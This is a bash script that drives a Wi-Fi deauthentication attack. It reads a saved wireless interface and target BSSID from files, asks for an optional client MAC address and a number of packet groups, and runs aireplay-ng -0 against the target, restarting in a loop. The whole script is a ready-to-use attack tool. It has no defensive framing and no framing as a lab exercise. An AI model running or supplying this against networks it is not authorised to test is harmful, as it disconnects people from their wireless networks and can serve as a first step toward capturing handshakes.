#!/bin/bash

read_parameters() {
	interface=$(cat .interface.txt)
	bssid=$(cat .current_target.txt)
}

aireplay() {
	clear
	echo -ne "[${green}+${default}] Press Enter to start deauthentication attack."
	read
	echo -ne "[${green}+${default}] Enter the MAC address of wireless client (optional, press enter for broadcast deauthentication): "
	read client
	echo -ne "[${green}+${default}] Enter the number of number of groups of deauthentication packets to send out: "
	read packets
	echo -e "[${green}+${default}] Press Enter to start the operation."
	read
	if [ -z "$client" ]
		then
			aireplay-ng -0 $packets -a $bssid $interface
			restart
		else
			aireplay-ng -0 $packets -c $client -a $bssid $interface
			unset client
			restart
	fi
}

restart() {
	echo -e -n "\n[${green}*${default}] Operation completed. Press Enter to restart."
	read
	aireplay
}

	red='\033[0;31m'
	green='\033[0;32m'
	yellow='\033[0;33m'
	default='\033[0;39m'

read_parameters
aireplay
restart
